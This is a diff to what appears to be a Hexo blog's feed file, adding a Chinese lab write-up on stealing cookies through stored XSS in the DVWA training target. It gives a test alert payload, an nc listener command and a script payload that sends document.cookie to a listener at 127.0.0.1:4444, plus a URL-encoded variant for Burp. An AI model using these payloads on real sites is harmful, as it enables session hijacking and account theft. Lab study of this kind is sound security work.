@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Xss获取cookie</title>
+      <link href="/2022/06/07/xss-cookie/"/>
+      <url>/2022/06/07/xss-cookie/</url>
+      
+        <content type="html"><![CDATA[<h1 id="XSS获取cookie"><a href="#XSS获取cookie" class="headerlink" title="XSS获取cookie"></a>XSS获取cookie</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次实验使用<code>dvwa</code>靶场搭建</p><p>使用工具<code>nc</code></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>首先把等级设置为<code>low</code></p><p><img src="/2022/06/07/xss-cookie/image-20220607154959588.png" alt="image-20220607154959588"></p><p>选择<code>XSS(Stored)</code>存储型</p><p><img src="/2022/06/07/xss-cookie/image-20220607155526688.png" alt="image-20220607155526688"></p><p>先测试 一下</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><img src="/2022/06/07/xss-cookie/image-20220607155954851.png" alt="image-20220607155954851"></p><p>弹出了，确定有xss漏洞</p><p>打开<code>nc</code></p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>构造xss语句</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img src="http://127.0.0.1:4444/?'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">+</span><span class="token string">'"/> '</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>但是这个有字数限制，可以通过burp抓包来更改</p><p><img src="/2022/06/07/xss-cookie/image-20220607160442487.png" alt="image-20220607160442487"></p><p>然后要<code>url</code>编码</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;img+src%3d"http%3a//127.0.0.1%3a4444/%3f'</span><span class="token operator">%</span>2bdocument<span class="token punctuation">.</span>cookie<span class="token operator">%</span>2b<span class="token string">'"/>+'</span><span class="token punctuation">)</span><span class="token operator">%</span>3b</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>放行</p><p><img src="/2022/06/07/xss-cookie/image-20220607160703455.png" alt="image-20220607160703455"></p><p>接收到<code>cookie</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> xss </tag>
+            
+            <tag> cookie </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>phpmyadmin后台getshell</title>
       <link href="/2022/05/24/phpmyadmin-webshell/"/>
       <url>/2022/05/24/phpmyadmin-webshell/</url>
